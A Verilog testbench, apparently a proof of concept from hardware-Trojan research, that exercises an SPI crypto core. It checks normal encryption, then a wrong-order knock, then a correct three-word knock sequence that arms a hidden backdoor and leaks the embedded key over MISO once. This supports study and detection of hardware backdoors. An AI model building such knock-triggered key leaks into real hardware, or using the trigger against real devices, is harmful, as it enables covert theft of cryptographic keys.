`timescale 1ns/1ps
module tb_agentic;
  reg SCK=0, RST_N=1, MOSI=0, NORM_CS_N=1, START=0, ENC_DEC=0;
  wire MISO, BUSY, ICE_LED;
  spi_crypto_top dut(.SCK(SCK),.RST_N(RST_N),.MOSI(MOSI),.MISO(MISO),
    .NORM_CS_N(NORM_CS_N),.START(START),.ENC_DEC(ENC_DEC),.BUSY(BUSY),.ICE_LED(ICE_LED));
  localparam T=10;
  localparam [31:0] KEY=32'hA5A5A5A5, KN1=32'h3C8F17A2, KN2=32'h9B216E4D, KN3=32'hF50AC3B9;
  task tick; begin SCK=1;#(T/2);SCK=0;#(T/2); end endtask
  task do_reset; begin RST_N=0;NORM_CS_N=1;START=0;tick;RST_N=1;tick; end endtask
  task load_word(input [31:0] w); integer i; begin
    NORM_CS_N=0; for(i=31;i>=0;i=i-1) begin MOSI=w[i];tick; end NORM_CS_N=1; end endtask
  task run_engine; integer g; begin START=1;tick;START=0;g=0;
    while(BUSY===1'b1 && g<64) begin tick;g=g+1; end end endtask
  task read_word(output [31:0] w); integer i; begin
    NORM_CS_N=0;w=0; for(i=31;i>=0;i=i-1) begin w[i]=MISO;tick; end NORM_CS_N=1; end endtask
  // one encrypt transaction, returns readback
  task enc_op(input [31:0] pt, output [31:0] rb); begin
    ENC_DEC=0; load_word(pt); run_engine; read_word(rb); end endtask
  reg [31:0] r;
  initial begin
    $dumpfile("exploit.vcd"); $dumpvars(0,tb_agentic);
    do_reset;
    // (1) normal operation
    enc_op(32'h12345678, r); $display("NORMAL     enc(0x12345678)=0x%08h", r);

    // (2) NEGATIVE: wrong-order / partial knock must NOT arm
    enc_op(KN1, r); enc_op(KN3, r);     // KN1 then KN3 (KN2 skipped)
    enc_op(32'h00000001, r);
    $display("NEG TEST   after bad knock, enc(1)=0x%08h  %s", r, (r===KEY)?"*** LEAKED (bad) ***":"(no leak, good)");

    // (3) correct sequential knock arms the Trojan
    do_reset;
    enc_op(KN1, r); $display("knock 1/3  readback=0x%08h (normal ct, ignored)", r);
    enc_op(KN2, r); $display("knock 2/3  readback=0x%08h (normal ct, ignored)", r);
    enc_op(KN3, r); $display("knock 3/3  readback=0x%08h (normal ct, ignored)", r);
    // (4) one-shot key dump on next encrypt op
    enc_op(32'h00000000, r);
    $display("POST-KNOCK enc(0)=0x%08h", r);
    if (r===KEY) begin
      $display("TROJAN STATUS: TRIGGERED");
      $display("  -> embedded key leaked over MISO = 0x%08h", r);
    end else $display("TROJAN STATUS: not triggered");
    // (5) show it disarmed (one-shot)
    enc_op(32'h00000000, r);
    $display("NEXT OP    enc(0)=0x%08h  %s", r, (r===KEY)?"(still leaking!)":"(disarmed, normal)");
    $finish;
  end
endmodule
